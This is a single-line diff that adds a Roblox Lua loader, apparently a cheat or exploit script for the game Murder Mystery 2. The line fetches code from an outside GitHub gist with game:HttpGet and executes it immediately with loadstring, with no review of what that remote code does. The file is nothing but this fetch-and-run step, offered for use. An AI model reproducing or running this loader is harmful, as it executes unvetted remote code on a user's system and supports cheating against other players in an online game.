@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/OtarDevv/37923c22312a786f3ac521692b412c41/raw/747834720d202a101630d8f27174dc14494970fe/Murder%2520Mystery%25202"))();
